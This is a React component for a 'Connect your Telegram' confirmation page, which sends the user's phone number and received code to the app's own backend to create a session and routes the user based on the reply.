// ConfirmTelegram.js
import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import "./ConfirmTelegram.css";
import { useBackendApi } from "../../components/api/axiosBackendApi";
import InputField from "../../components/InputField/InputField";
import "../../style/common.css";

function ConfirmTelegram() {
    const location = useLocation();
    const navigate = useNavigate();
    const [phone, setPhone] = useState(location.state?.phone || "");
    const [code, setCode] = useState("");
    const [username] = useState(location.state?.username || "");
    const [isLoading, setIsLoading] = useState(false);
    const [errorMessage, setErrorMessage] = useState("");
    const { apiRequest } = useBackendApi();

    const handleGoBack = () => navigate("/connect-telegram");

    const getErrorMessage = (error) => error.response?.data?.detail || error.message;

    const handleSendCode = async () => {
        setIsLoading(true);
        setErrorMessage("");

        try {
            const data = await apiRequest("/session/pass_code", {
                method: "POST",
                data: { phone, password_or_code: code },
            });

            if (
                data?.status === true &&
                (data?.detail === "Code Sent!" || data?.detail === "Session successfully created")
            ) {
                return navigate("/congratulations");
            }
            setErrorMessage(data?.detail || "Unknown error from server");
        } catch (error) {
            const errorMsg = getErrorMessage(error);
            if (errorMsg === "Password") {
                return navigate("/password", { state: { phone, username } });
            }
            setErrorMessage(errorMsg);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="form-container">
            <div className="confirm-telegram-card">
                <h2>Connect your Telegram</h2>
                <p>
                    We've sent a confirmation code to {phone}. Please enter the code below.
                </p>

                <InputField
                    type="tel"
                    placeholder="Phone Number"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                />

                <InputField
                    type="text"
                    placeholder="Enter received code"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                />

                <div className="button-group">
                    <button className="go-back-btn" onClick={handleGoBack} disabled={isLoading}>
                        Go Back
                    </button>
                    <button className="confirm-btn" onClick={handleSendCode} disabled={isLoading}>
                        {isLoading ? "Processing..." : "Confirm"}
                    </button>
                </div>
                {errorMessage && <p className="error-text">{errorMessage}</p>}
            </div>
        </div>
    );
}

export default ConfirmTelegram;
